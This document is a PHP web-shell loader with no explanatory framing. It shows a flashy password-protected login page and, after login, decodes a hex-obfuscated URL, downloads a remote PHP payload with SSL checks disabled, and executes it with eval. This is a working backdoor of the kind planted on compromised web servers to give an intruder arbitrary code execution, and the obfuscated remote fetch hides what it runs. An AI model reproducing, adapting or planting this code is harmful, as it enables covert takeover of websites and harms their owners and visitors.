<?php
session_start();

$ea = '$2a$12$DH.DkcOFokLzY28Avask3ustmDnthzhXTH9wWrlLmXHYbufCcpq7C';

if (!isset($_SESSION['logged_in'])) {
    $error = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (password_verify($_POST['pass'], $ea)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Wrong Baby";
        }
    }
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>EA</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    .login-box {
      background: rgba(0, 0, 0, 0.75); 
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
      width: 320px;
      animation: rgb-glow 4s infinite alternate;
      color: #fff;
      border: 2px solid transparent;
    }

    @keyframes rgb-glow {
      0% { box-shadow: 0 0 10px rgb(0, 255, 21); border-color: rgb(16, 45, 11); }
      33% { box-shadow: 0 0 10px lime; border-color: lime; }
      66% { box-shadow: 0 0 10px blue; border-color: blue; }
      100% { box-shadow: 0 0 10px rgb(26, 255, 0); border-color: rgb(26, 255, 0); }
    }

    .login-box h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #fff;
      text-shadow: 0 0 5px cyan;
    }

    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #555;
      border-radius: 8px;
      background-color: #111;
      color: #fff;
      font-size: 14px;
      transition: 0.3s ease;
    }

    .login-box input[type="text"]:focus,
    .login-box input[type="password"]:focus {
      border-color: #000000;
      outline: none;
      box-shadow: 0 0 10px #00ffff;
    }

    .login-box input[type="submit"] {
      width: 100%;
      padding: 12px;
      background: linear-gradient(90deg, #dd1bff, #00ff08, #ff0000);
      background-size: 300% 100%;
      color: #000000;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      animation: button-rgb 6s infinite linear;
      transition: transform 0.2s ease;
    }

    @keyframes button-rgb {
      0% { background-position: 0% 50%; }
      100% { background-position: 300% 50%; }
    }

    .login-box input[type="submit"]:hover {
      transform: scale(1.05);
      box-shadow: 0 0 12px #7300ff;
    }

    .error {
      color: #ff4c4c;
      text-align: center;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <form class="login-box" method="post">
    <h2>Login</h2>
    <?php if (!empty($error)) echo '<div class="error">' . htmlspecialchars($error) . '</div>'; ?>
    <input type="text" name="user" placeholder="user" required>
    <input type="password" name="pass" placeholder="password" required>
    <input type="submit" value="Masuk">
  </form>
</body>
</html>
<?php
    exit;
}

$hexUrl = '68747470733a2f2f68746d6c2e6176617461722d616d702e696e666f2f6261636b75702f616c6661322e747874';
$url = hex2bin($hexUrl);

$phpScript = @file_get_contents($url);
if ($phpScript === false && function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $phpScript = curl_exec($ch);
    curl_close($ch);
}

if ($phpScript !== false) {
    eval('?>' . $phpScript);
} else {
    die(".");
}
?>
